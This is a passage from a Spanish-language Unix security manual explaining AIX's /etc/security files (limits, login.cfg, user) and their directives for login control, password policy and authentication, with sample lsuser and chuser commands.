&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;time&#x005F;last&#x005F;login&#x00A0;=&#x00A0;1005297794
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tty&#x005F;last&#x005F;login&#x00A0;=&#x00A0;ttyp0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;host&#x005F;last&#x005F;login&#x00A0;=&#x00A0;anita
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;unsuccessful&#x005F;login&#x005F;count&#x00A0;=&#x00A0;0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;time&#x005F;last&#x005F;unsuccessful&#x005F;login&#x00A0;=&#x00A0;1004445794
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tty&#x005F;last&#x005F;unsuccessful&#x005F;login&#x00A0;=&#x00A0;/dev/pts/14
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;host&#x005F;last&#x005F;unsuccessful&#x005F;login&#x00A0;=&#x00A0;luisa
</literallayout>
<!--l. 468--><para>Como podemos ver, el nombre de cada campo es autoexplicativo de su funci&#x00F3;n; el &#x00FA;nico que quiz&#x00E1;s puede
plantear alguna duda es unsuccessful<informalequation><graphic 
fileref="unixsec189x.gif"></graphic></informalequation>login<informalequation><graphic 
fileref="unixsec190x.gif"></graphic></informalequation>count, que no es m&#x00E1;s que un contador que indica el n&#x00FA;mero
de intentos de acceso fallidos desde la &#x00FA;ltima entrada al sistema.
<!--br/-->
<!--br/-->Para consultar los par&#x00E1;metros de cada usuario almacenados en este archivo no es necesario editar o
visualizar el &#xFB01;chero: mediante la orden lsuser podemos obtener el valor de cada uno de ellos; si por
ejemplo nos interesa el nombre de la m&#x00E1;quina desde la que el usuario toni accedi&#x00F3; por &#x00FA;ltima vez al sistema,
podemos conseguirlo de esta forma:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;host&#x005F;last&#x005F;login&#x00A0;toni
&#x00A0;toni&#x00A0;host&#x005F;last&#x005F;login=anita
&#x00A0;bruja:/#
</literallayout>
<!--l. 484--><para>
  </para></section><!--end subsection--><!--l. 484--><section 
role="subsection"><title><abbrev role="title-mark">11.4.5</abbrev><anchor 
   id="x1-16700011.4.5"  ></anchor>El &#xFB01;chero /etc/security/limits</title>
<!--l. 485--><para>  En este archivo se de&#xFB01;nen l&#x02CA;&#x0131;mites a algunos de los recursos que ofrece un entorno de trabajo AIX; como
muchos de los archivos del directorio, contiene una stanza que se aplica por defecto y luego entradas &#x2013;
vac&#x02CA;&#x0131;as por lo general &#x2013; para cada usuario, en las que se pueden personalizar par&#x00E1;metros que s&#x00F3;lo se aplican a
uno o varios usuarios y no a todos (generalmente se de&#xFB01;nen al crear al usuario). Las diferentes directivas
del archivo son las siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 493--><para>fsize
     <!--br/-->Tama~no m&#x00E1;ximo de un archivo en bloques de 512 bytes.
     </para></listitem>
     <listitem>
     <!--l. 495--><para>core
     <!--br/-->Tama~no m&#x00E1;ximo de un &#xFB01;chero core (volcado de memoria) en bloques de 512 bytes.
     </para></listitem>
     <listitem>
     <!--l. 498--><para>cpu
     <!--br/-->Tiempo l&#x02CA;&#x0131;mite de CPU por proceso, especi&#xFB01;cado en segundos. Por defecto no est&#x00E1; establecido
     para ning&#x00FA;n usuario.
     </para></listitem>
     <listitem>
     <!--l. 501--><para>data
     <!--br/-->L&#x02CA;&#x0131;mite de tama~no del segmento de datos de un proceso del usuario, en bloques de 512 bytes.
     </para></listitem>
     <listitem>
     <!--l. 504--><para>stack
     <!--br/-->L&#x02CA;&#x0131;mite de tama~no de la pila de un proceso en bloques de 512 bytes.
     </para></listitem>
     <listitem>
     <!--l. 506--><para>rss
     <!--br/-->L&#x02CA;&#x0131;mite del tama~no de memoria utilizada por proceso, en bloques de 512 bytes.
     </para></listitem>
     <listitem>
     <!--l. 509--><para>nofiles
     <!--br/-->N&#x00FA;mero m&#x00E1;ximo de descriptores de &#xFB01;chero abiertos.</para></listitem></itemizedlist>

<!--l. 512--><para>Cada uno de los l&#x02CA;&#x0131;mites anteriores es un l&#x02CA;&#x0131;mite soft (blando) que el usuario puede sobrepasar si lo desea,
modi&#xFB01;cando su valor mediante la orden ulimit; existen, de&#xFB01;nidos en el mismo archivo, l&#x02CA;&#x0131;mites hard
(duros) que el usuario no puede incrementar de ninguna forma. El nombre de cada uno de ellos
es el mismo que el de su equivalente soft pero a~nadi&#x00E9;ndole la coletilla &#x2018;<informalequation><graphic 
fileref="unixsec191x.gif"></graphic></informalequation>hard&#x2019;: fsize<informalequation><graphic 
fileref="unixsec192x.gif"></graphic></informalequation>hard,
rss<informalequation><graphic 
fileref="unixsec193x.gif"></graphic></informalequation>hard,etc.
<!--br/-->
<!--br/-->Podemos ver los l&#x02CA;&#x0131;mites aplicables a uno o m&#x00E1;s usuarios mediante la orden &#x2018;lsuser&#x2019; (un valor de &#x2018;-1&#x2019; indica
que se trata de un recurso no limitado al usuario en cuesti&#x00F3;n):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-f&#x00A0;-a&#x00A0;fsize&#x00A0;core&#x00A0;cpu&#x00A0;data&#x00A0;stack&#x00A0;rss&#x00A0;nofiles&#x00A0;toni
&#x00A0;toni:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fsize=2097151
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;core=2097151
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cpu=-1
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;data=262144
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;stack=65536
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rss=65536
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nofiles=2000
&#x00A0;
&#x00A0;bruja:/#
</literallayout>
<!--l. 537--><para>Por defecto, AIX ofrece unos l&#x02CA;&#x0131;mites bastante razonables a los recursos que cada usuario puede consumir; no
obstante, en funci&#x00F3;n de para qu&#x00E9; se utilice cada sistema concreto, es recomendable que sea el administrador
el que deba especi&#xFB01;car qu&#x00E9; limites impone a los usuarios sobre los recursos de la m&#x00E1;quina para prevenir
negaciones de servicio contra los mismos.
  </para></section><!--end subsection--><!--l. 542--><section 
role="subsection"><title><abbrev role="title-mark">11.4.6</abbrev><anchor 
   id="x1-16800011.4.6"  ></anchor>El &#xFB01;chero /etc/security/login.cfg</title>
<!--l. 543--><para>  En este archivo se de&#xFB01;nen ciertos par&#x00E1;metros de control para las conexiones remotas a un sistema AIX;
como veremos en este punto, todos ellos tienen implicaciones directas, aunque de diferente grado, en la
seguridad del entorno de trabajo. Se puede dividir en tres grandes &#x00E1;reas: la correspondiente a la de&#xFB01;nici&#x00F3;n de
puertos, la relativa a m&#x00E9;todos de autenticaci&#x00F3;n de usuarios y la que de&#xFB01;ne atributos tambi&#x00E9;n de los usuarios;
todas ellas contienen una stanza por defecto, y adicionalmente de&#xFB01;niciones particulares para elementos
concretos.
<!--br/-->
<!--br/-->La primera gran &#x00E1;rea del archivo, la relativa a los puertos, est&#x00E1; formada por una serie de par&#x00E1;metros que
de&#xFB01;nen caracter&#x02CA;&#x0131;sticas del acceso al sistema a trav&#x00E9;s de ellos; la primera directiva de este grupo es herald,
que permite de&#xFB01;nir el mensaje que se muestra en la pantalla del usuario que trata de establecer una
conexi&#x00F3;n remota con el sistema (algo similar al archivo /etc/motd del resto de Unices, &#xFB01;chero que en AIX
no existe &#x2013; y si es creado no tiene efecto &#x2013;). Cuando tratamos de acceder a una m&#x00E1;quina AIX el mensaje
que se muestra es similar al siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;bruja
&#x00A0;Trying&#x00A0;192.168.0.10...
&#x00A0;Connected&#x00A0;to&#x00A0;bruja.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;
&#x00A0;telnet&#x00A0;(bruja)
&#x00A0;
&#x00A0;AIX&#x00A0;Version&#x00A0;4
&#x00A0;(C)&#x00A0;Copyrights&#x00A0;by&#x00A0;IBM&#x00A0;and&#x00A0;by&#x00A0;others&#x00A0;1982,&#x00A0;1996.
&#x00A0;login:
</literallayout>
<!--l. 575--><para>Modi&#xFB01;cando la directiva herald de /etc/security/login.cfg podemos de&#xFB01;nir otros mensajes de
presentaci&#x00F3;n; si por ejemplo queremos simular que nuestra m&#x00E1;quina ejecuta Solaris en lugar de AIX,
podemos emular el mensaje del primero:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;grep&#x00A0;herald&#x00A0;/etc/security/login.cfg
&#x00A0;herald&#x00A0;=&#x00A0;&#x0022;SunOS&#x00A0;5.8&#x005C;n&#x005C;nlogin:&#x00A0;&#x0022;
&#x00A0;bruja:/#
</literallayout>
<!--l. 586--><para>As&#x02CA;&#x0131;, cuando un usuario trate de conectar al sistema, ver&#x00E1; algo parecido a lo siguiente:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;telnet&#x00A0;0
&#x00A0;Trying...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;SunOS&#x00A0;5.8
&#x00A0;
&#x00A0;login:&#x02C6;D&#x00A0;Connection&#x00A0;closed.
&#x00A0;bruja:/#
</literallayout>
<!--l. 601--><para>Relacionada con el anterior par&#x00E1;metro tenemos la directiva herald2, formada por una cadena de texto y que
de&#xFB01;ne el mensaje de login impreso en la terminal tras un intento fallido de acceso al sistema; por defecto,
esta cadena de texto es un nuevo prompt de login.
<!--br/-->
<!--br/-->Tambi&#x00E9;n relativa a los puertos, otra directiva interesante que podemos encontrar en el &#xFB01;chero login.cfg es
logindelay, que permite especi&#xFB01;car el retardo en segundos entre intentos consecutivos de entrada al
sistema; si es diferente de 0 (si es 0 se deshabilita su efecto) el valor de este par&#x00E1;metro se multiplica por el
n&#x00FA;mero de intentos fallidos: si logindelay es 1 el retardo entre el primer y el segundo intento ser&#x00E1; de un
segundo, entre el segundo y el tercero ser&#x00E1; de dos, etc. Junto a este par&#x00E1;metro podemos de&#xFB01;nir
tambi&#x00E9;n la directiva logindisable, que marca el n&#x00FA;mero de intentos de entrada al sistema
fallidos que una conexi&#x00F3;n acepta antes de cerrarse &#x2013; o bloquearse, si se trata de una l&#x02CA;&#x0131;nea serie &#x2013;,
logininterval, que de&#xFB01;ne los segundos durante los que se tienen que producir los intentos fallidos
de conexi&#x00F3;n para que se cierre o bloquee la misma, y loginreenable, que obviamente indica
el intervalo &#x2013; en minutos &#x2013; que un puerto va a permanecer bloqueado (si su valor es 0 &#x2013; y
por defecto lo es &#x2013; estar&#x00E1; as&#x02CA;&#x0131; hasta que el administrador lo desbloquee manualmente mediante
chsec).
<!--br/-->
<!--br/-->Otra entrada &#x00FA;til en el archivo login.cfg es logintimes, que como su nombre indica de&#xFB01;ne las horas y
d&#x02CA;&#x0131;as durante las que un puerto determinado puede ser utilizado para acceder al sistema, algo similar
(en idea, no en sintaxis) al archivo /etc/porttime de Linux o al prot.pwd.DB de HP-UX
10.x. El formato utilizado para especi&#xFB01;car los intervalos de horas o d&#x02CA;&#x0131;as en los que el acceso se
permite (entradas llamadas ALLOW) o se deniega (entradas DENY) no es inmediato, por lo que es
recomendable &#x2013; como siempre en Unix &#x2013; consultar la p&#x00E1;gina del manual de login.cfg. Por defecto,
se permite a todos los usuarios acceder a trav&#x00E9;s de cualquier l&#x02CA;&#x0131;nea sin importar el d&#x02CA;&#x0131;a ni la
hora.
<!--br/-->
<!--br/-->Para &#xFB01;nalizar con el &#x00E1;rea de puertos vamos a comentar un par de directivas que tambi&#x00E9;n se pueden de&#xFB01;nir en
el archivo login.cfg: se trata de sak<informalequation><graphic 
fileref="unixsec194x.gif"></graphic></informalequation>enabled y synonym. La primera de ellas indica si el secure attention
key (SAK) est&#x00E1; habilitado en el puerto, lo que implica que los usuarios pueden obtener una ruta de
comunicaci&#x00F3;n &#xFB01;able (trusted communication path, TCP) mediante la combinaci&#x00F3;n de teclas Ctrl-X Ctrl-R; en
la secci&#x00F3;n dedicada a la base &#xFB01;able de c&#x00F3;mputo de los sistemas Unix ya hablamos de este tipo de
comunicaciones seguras, por lo que no vamos a entrar aqu&#x02CA;&#x0131; en m&#x00E1;s detalles. La segunda de las
directivas a las que hac&#x02CA;&#x0131;amos referencia, la denominada synonym, tiene como objetivo de&#xFB01;nir
sin&#x00F3;nimos para una terminal concreta; est&#x00E1; bastante relacionada con la primera, ya que restringe
el acceso al puerto, que s&#x00F3;lo se utilizar&#x00E1; para establecer una ruta de comunicaci&#x00F3;n &#xFB01;able con el
sistema.
<!--br/-->
<!--br/-->La segunda gran &#x00E1;rea del &#xFB01;chero /etc/security/login.cfg hace referencia, como dijimos
al principio, a los m&#x00E9;todos de autenticaci&#x00F3;n de usuarios disponibles en la m&#x00E1;quina. M&#x00E1;s tarde,
cuando hablemos del &#xFB01;chero /etc/security/user, veremos que se pueden de&#xFB01;nir mecanismos
secundarios de autenticaci&#x00F3;n en el sistema que funcionan de forma independiente o junto al esquema
cl&#x00E1;sico de nombre de usuario y contrase~na. Los programas que implanten estos mecanismos
adicionales han de de&#xFB01;nirse dentro de una stanza, bajo la directiva &#x2018;program&#x2019;, que le de un

nombre al modelo de autenticaci&#x00F3;n que posteriormente se de&#xFB01;nir&#x00E1; para uno o m&#x00E1;s usuarios en
/etc/security/user; insistimos en la palabra &#x2018;adicionales&#x2019;, ya que los esquemas de autenticaci&#x00F3;n
cl&#x00E1;sicos no requieren de&#xFB01;nici&#x00F3;n (SYSTEM, para acceder con nombre de usuario y contrase~na,
y NONE, para acceder sin autenticaci&#x00F3;n). Por ejemplo, imaginemos que si queremos de&#xFB01;nir
un nuevo m&#x00E9;todo basado en claves de un solo uso al que vamos a denominar authone y que
est&#x00E1; implementado en el programa /usr/local/auth/onetime; su stanza ser&#x02CA;&#x0131;a similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;authone:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;program&#x00A0;=&#x00A0;/usr/local/auth/onetime
</literallayout>
<!--l. 668--><para>La &#x00FA;ltima &#x00E1;rea del archivo proporciona la de&#xFB01;nici&#x00F3;n de algunos atributos globales de los usuarios bajo una
stanza &#x00FA;nica: usw. El primero de estos atributos es logintimeout, que de&#xFB01;ne el tiempo en
segundos (60, por defecto) que un usuario tiene para teclear su contrase~na cuando el sistema se lo
solicita. Un segundo par&#x00E1;metro, maxlogins, de&#xFB01;ne el n&#x00FA;mero m&#x00E1;ximo de conexiones simult&#x00E1;neas que
un usuario puede abrir en el sistema: el valor por defecto, 100, es a todas luces excesivo en
la mayor parte de entornos, por lo que deber&#x02CA;&#x0131;amos especi&#xFB01;car un valor adecuado a nuestro
sistema &#x2013; es imposible dar un valor &#x2018;&#x00F3;ptimo&#x2019; para esta directiva &#x2013;; si el valor de maxlogins
es 0, el n&#x00FA;mero m&#x00E1;ximo de conexiones simult&#x00E1;neas de un usuario est&#x00E1; ilimitado. Finalmente, el
&#x00FA;ltimo par&#x00E1;metro, shells, de&#xFB01;ne los int&#x00E9;rpretes de comandos v&#x00E1;lidos en la m&#x00E1;quina, algo similar al
archivo /etc/shells de otros Unices. Una entrada t&#x02CA;&#x0131;pica de esta stanza puede ser similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;usw:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;shells&#x00A0;=&#x00A0;/bin/sh,/bin/bsh,/bin/csh,/bin/ksh,/bin/tsh,/usr/bin/sh
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;maxlogins&#x00A0;=&#x00A0;5
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;logintimeout&#x00A0;=&#x00A0;30
</literallayout>
<!--l. 690--><para>
  </para></section><!--end subsection--><!--l. 690--><section 
role="subsection"><title><abbrev role="title-mark">11.4.7</abbrev><anchor 
   id="x1-16900011.4.7"  ></anchor>El &#xFB01;chero /etc/security/user</title>
<!--l. 691--><para>  En /etc/security/user se de&#xFB01;nen atributos extendidos de cada usuario; dichos atributos no son m&#x00E1;s
que los no incluidos en el &#xFB01;chero /etc/passwd convencional de todo sistema Unix: mientras que en este
&#x00FA;ltimo encontramos datos como el login o el UID de cada usuario, en el primero tenemos informaci&#x00F3;n como la
fecha de caducidad de las contrase~nas, las horas a las que puede conectar cada usuario, o los requisitos de
seguridad m&#x02CA;&#x0131;nimos para su clave. Cuando se a~nade un usuario al sistema mediante la orden mkuser se
genera una nueva stanza en el &#xFB01;chero correspondiente al nuevo usuario, con unos atributos
por defecto tomados del archivo /usr/lib/security/mkuser.default; existen numerosos
atributos extendidos para los usuarios, y conocer algunos de ellos es vital para incrementar los
niveles de seguridad ofrecidos por defecto por AIX. En este punto vamos a hablar de estos
atributos.
<!--br/-->
<!--br/-->Una directiva b&#x00E1;sica almacenada en /etc/security/user es account<informalequation><graphic 
fileref="unixsec195x.gif"></graphic></informalequation>locked, que evidentemente indica si
una cuenta est&#x00E1; bloqueada o no lo est&#x00E1;; es una variable booleana, por lo que sus posibles valores son
sencillamente true o false (o equivalentemente, yes y always o no y never). Aunque es muy
similar a esta, la directiva login (tambi&#x00E9;n booleana) no es exactamente igual: si su valor es
false o equivalente el usuario no puede acceder al sistema, pero su cuenta no est&#x00E1; bloqueada,
ya que es posible llegar a ella mediante su. Otra restricci&#x00F3;n de acceso para un usuario viene
determinada por rlogin, que de&#xFB01;ne si un usuario puede acceder al sistema de forma remota
a trav&#x00E9;s de telnet o rlogin (otros m&#x00E9;todos de acceso, como SSH, no son controlados por esta
directiva).
<!--br/-->
<!--br/-->El que un usuario no tenga su cuenta bloqueada ni su acceso deshabilitado implica que puede utilizar su
login para entrar &#x2013; evidentemente si su autenticaci&#x00F3;n es correcta &#x2013; al sistema; algunas caracter&#x02CA;&#x0131;sticas de este
acceso tambi&#x00E9;n se de&#xFB01;nen en /etc/security/user: por ejemplo, las horas y d&#x02CA;&#x0131;as que un determinado
usuario puede acceder al equipo, mediante la directiva logintimes y las terminales desde las que puede
hacerlo, mediante ttys. La sintaxis de la primera es equivalente a la utilizada en el &#xFB01;chero
login.cfg, pero afectando ahora a usuarios concretos y no a puertos, mientras que la segunda se
de&#xFB01;ne mediante una lista de terminales separadas por comas; alternativamente se pueden
usar los comodines &#x2018;ALL&#x2019; o &#x2018;<informalequation><graphic 
fileref="unixsec196x.gif"></graphic></informalequation>&#x2019; para indicar que el usuario puede acceder a trav&#x00E9;s de cualquier
l&#x02CA;&#x0131;nea:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;ttys&#x00A0;toni
&#x00A0;toni&#x00A0;ttys=ALL
&#x00A0;bruja:/#
</literallayout>
<!--l. 735--><para>Un grupo de directivas del archivo /etc/security/user tambi&#x00E9;n importantes para nuestra seguridad son las
relativas a la contrase~na de cada usuario; una de ellas es expires, que de&#xFB01;ne la fecha de expiraci&#x00F3;n de la
clave en formato MMDDHHMMYY (un cero, valor por defecto, indica que el password nunca
caduca):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;expires&#x00A0;toni
&#x00A0;toni&#x00A0;expires=0
&#x00A0;bruja:/#
</literallayout>
<!--l. 747--><para>Tambi&#x00E9;n relacionada con el envejecimiento de claves tenemos la directiva pwdwarntime, que de&#xFB01;ne el n&#x00FA;mero
de d&#x02CA;&#x0131;as de antelaci&#x00F3;n con los que se avisar&#x00E1; a un usuario antes de obligarle a cambiar su contrase~na. El
periodo de validez de una clave viene indicado en semanas por la directiva maxage, cuyo valor puede
oscilar entre 0 (valor por defecto, que indica que no existe caducidad) o 52 (un a~no de vida); por contra, el
tiempo m&#x02CA;&#x0131;nimo de vida de la contrase~na se de&#xFB01;ne en minage, que puede tomar los mismos valores que la
directiva anterior. Cuando una clave caduca entra en juego la directiva maxexpired, que indica en semanas
el tiempo durante el que se permite a un usuario (antes de bloquear su cuenta) acceder al
sistema para cambiar su password, y cuyo valor oscila entre -1 (tiempo ilimitado) y 52 (un
a~no).
<!--br/-->
<!--br/-->Cuando un usuario cambia su contrase~na, obligado o no por el sistema, entran en juego otra serie de
par&#x00E1;metros tambi&#x00E9;n de&#xFB01;nidos en el &#xFB01;chero /etc/security/user: los relativos a las caracter&#x02CA;&#x0131;sticas que ha de
poseer una clave del sistema. Sin duda uno de los m&#x00E1;s importantes para la seguridad, y que no aparece en
otros Unices habituales, es dictionlist; esta directiva permite de&#xFB01;nir &#xFB01;cheros de diccionario
(indicando las rutas absolutas de los mismos separadas por comas) contra los que se comprobar&#x00E1;
cada clave nueva elegida por un usuario. Los &#xFB01;cheros han de ser simples archivos de texto
con palabras habituales &#x2013; o modi&#xFB01;caciones de las mismas &#x2013; utilizadas en un lenguaje o &#x00E1;rea
espec&#x02CA;&#x0131;&#xFB01;ca, similares a los utilizados como entrada de un programa rompedor de contrase~nas
tipo Crack o John the Ripper. Adicionalmente, AIX permite indicar m&#x00E9;todos alternativos para
comprobar la robustez de una clave mediante la directiva pwdchecks, que de&#xFB01;ne m&#x00E9;todos de
comprobaci&#x00F3;n cargados en tiempo de ejecuci&#x00F3;n cuando un usuario ejecuta passwd para cambiar su
contrase~na.
<!--br/-->
<!--br/-->Siguiendo con los par&#x00E1;metros relativos a las claves de usuario tenemos una serie de directivas que son b&#x00E1;sicas
para garantizar la robustez de las contrase~nas; una de ellas es minlen, que marca la longitud m&#x02CA;&#x0131;nima de
una clave y que por defecto est&#x00E1; a cero (un valor m&#x00E1;s adecuado ser&#x02CA;&#x0131;a seis). Adem&#x00E1;s, mediante
minalpha y minother podemos de&#xFB01;nir el n&#x00FA;mero m&#x02CA;&#x0131;nimo de caracteres alfab&#x00E9;ticos y no alfab&#x00E9;ticos
(respectivamente) exigibles en una clave; como en el anterior caso, el valor por defecto de
ambos es cero, por lo que es recomendable aumentarlo como m&#x02CA;&#x0131;nimo hasta dos, para garantizar
que todo password tiene por lo menos un par de letras y un par de caracteres num&#x00E9;ricos o de
s&#x02CA;&#x0131;mbolos. Otra directiva interesante es maxrepeats, que permite especi&#xFB01;car el n&#x00FA;mero m&#x00E1;ximo de
veces que un determinado car&#x00E1;cter puede aparecer en una clave; su valor por defecto es ocho
(ilimitado), y como siempre es importante modi&#xFB01;car esta variable para darle un valor diferente y
acorde a nuestra pol&#x02CA;&#x0131;tica de seguridad: por ejemplo dos, de forma que una misma letra, n&#x00FA;mero
o signo no aparezca m&#x00E1;s de un par de veces en la clave de un usuario; adem&#x00E1;s, AIX tambi&#x00E9;n
permite obligar a los usuarios a utilizar un cierto n&#x00FA;mero de caracteres nuevos en una clave
(caracteres no usados en el anterior password) mediante la directiva mindiff, cuyo valor puede
oscilar entre 0 (por defecto) y 8, que obligar&#x02CA;&#x0131;a al usuario a utilizar s&#x00F3;lo caracteres nuevos en su
clave.
<!--br/-->
<!--br/-->Otras directivas relacionadas con las caracter&#x02CA;&#x0131;sticas de una clave son las relativas a los hist&#x00F3;ricos de
contrase~nas: en primer lugar, histexpire marca el periodo (en semanas) que un usuario no puede
reutilizar su clave antigua. Su valor por defecto es cero, lo cual evidentemente no bene&#xFB01;cia mucho
nuestra seguridad, por lo que es recomendable asignarle a esta directiva un valor entre 12 (unos
tres meses) y 52 (un a~no); por su parte, mediante histsize podemos indicar el n&#x00FA;mero de
contrase~nas antiguas que no pueden ser reutilizadas (hasta cincuenta), lo que combinado con el valor
m&#x00E1;ximo aceptado por histexpire (260 semanas, o, lo que es lo mismo, cinco a~nos) nos da una
idea de la potencia de AIX en la gesti&#x00F3;n de sus claves: m&#x00E1;s que su&#xFB01;ciente en la mayor parte de
entornos.

<!--br/-->
<!--br/-->Una entrada de /etc/security/user que hay que tratar con mucho cuidado, ya que incluso puede ser
peligrosa para la seguridad de nuestros usuarios, es loginretries; indica el n&#x00FA;mero de intentos fallidos de
acceso al sistema que puede efectuar un usuario antes de que su cuenta se bloquee. Evidentemente,
esto nos puede ayudar a detener a un atacante que intente acceder al sistema adivinando la
contrase~na de alguno de nuestros usuarios, pero es tambi&#x00E9;n un arma de doble &#xFB01;lo: si un pirata
quiere causar una negaci&#x00F3;n de servicio a uno o varios usuarios, no tiene m&#x00E1;s que introducir el
login de los mismos y contrase~nas aleatorias cuando el sistema se lo solicita, lo que har&#x00E1; que
AIX inhabilite el acceso leg&#x02CA;&#x0131;timo de esos usuarios causando un perfecto ataque de negaci&#x00F3;n
de servicio contra los mismos. Quiz&#x00E1;s en la mayor parte de los sistemas sea una buena idea
no habilitar esta directiva (asign&#x00E1;ndole un valor de 0, el que tiene por defecto), y prevenir el
hecho de que un pirata pueda &#x2018;adivinar&#x2019; una contrase~na implantando unas pol&#x02CA;&#x0131;ticas de claves
adecuadas.
<!--br/-->
<!--br/-->Otras directivas interesantes de /etc/security/user son las relativas a los esquemas de autenticaci&#x00F3;n de
usuarios seguidos en el sistema; auth1 de&#xFB01;ne el m&#x00E9;todo de autenticaci&#x00F3;n primario de un usuario y acepta
tres valores que se pueden combinar entre s&#x02CA;&#x0131;: NONE (no existe autenticaci&#x00F3;n), SYSTEM (el m&#x00E9;todo cl&#x00E1;sico
basado en login y password), y &#xFB01;nalmente token;argument. Sin duda este &#x00FA;ltimo es el m&#x00E1;s interesante, ya
que permite a un administrador utilizar m&#x00E9;todos alternativos &#x2013; por s&#x02CA;&#x0131; s&#x00F3;los o, m&#x00E1;s habitual, combinados con
el cl&#x00E1;sico basado en login y password &#x2013; para autenticar a uno o varios usuarios. Estos m&#x00E9;todos (&#x2018;token&#x2019;) han
de estar de&#xFB01;nidos mediante una stanza v&#x00E1;lida, como ya vimos, en el archivo /etc/security/login.cfg, y
el programa que los implemente ser&#x00E1; ejecutado recibiendo como primer par&#x00E1;metro el argumento &#x2018;argument&#x2019;
de&#xFB01;nido en la entrada.
<!--br/-->
<!--br/-->Imaginemos una situaci&#x00F3;n en la que la autenticaci&#x00F3;n m&#x00FA;ltiple nos puede resultar &#x00FA;til: queremos que ciertos
usuarios del sistema, aparte de autenticarse con su login y password, tengan que proporcionar una clave
adicional para acceder a la m&#x00E1;quina, por ejemplo la de un usuario especial sin acceso real (sin shell ni
acceso ftp). Si uno de esos usuarios es toni y el usuario especial es sistemas, deber&#x02CA;&#x0131;amos
de&#xFB01;nir la entrada auth1 de toni para que se efectue en primer lugar la autenticaci&#x00F3;n cl&#x00E1;sica y
posteriormente se pida la clave de sistemas &#x2013; modelo SYSTEM pero en este caso con el par&#x00E1;metro
&#x2018;sistemas&#x2019; &#x2013;; esto lo conseguimos ejecutando la orden chuser (o equivalentemente modi&#xFB01;cando
el &#xFB01;chero /etc/security/user con un simple editor, aunque es recomendable la primera
aproximaci&#x00F3;n):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;chuser&#x00A0;&#x0022;auth1=SYSTEM,SYSTEM;sistemas&#x0022;&#x00A0;toni
&#x00A0;bruja:/#&#x00A0;lsuser&#x00A0;-a&#x00A0;auth1&#x00A0;toni
&#x00A0;toni&#x00A0;auth1=SYSTEM,SYSTEM;sistemas
&#x00A0;bruja:/#
</literallayout>
<!--l. 856--><para>Cuando toni trate de acceder al sistema se le solicitar&#x00E1; su clave y, si esta es correcta, la
clave de sistemas; si esta &#x00FA;ltima tambi&#x00E9;n es v&#x00E1;lida el acceso se permitir&#x00E1;, deneg&#x00E1;ndose en caso
contrario <anchor 
   id="x1-169001f2"  ></anchor><footnote><para>     Esto es as&#x02CA;&#x0131; en accesos telnet o r-<informalequation><graphic 
fileref="unixsec198x.gif"></graphic></informalequation>; SSH ignorar&#x00E1; el segundo esquema de autenticaci&#x00F3;n, proporcionando acceso s&#x00F3;lo con la
clave de toni.</para></footnote>.
<!--br/-->
<!--br/-->Otra directiva relacionada con la autenticaci&#x00F3;n de usuarios es auth2, que de&#xFB01;ne los m&#x00E9;todos secundarios de
autenticaci&#x00F3;n en el sistema; aunque la idea y sintaxis de los m&#x00E9;todos secundarios es similar a los
de&#xFB01;nidos en auth1, la principal diferencia con estos es que los secundarios no son de obligado
cumplimiento: para acceder al sistema, un usuario ha de autenticarse correctamente en todos
los m&#x00E9;todos primarios, y si lo hace, aunque falle en los secundarios, el acceso es permitido.
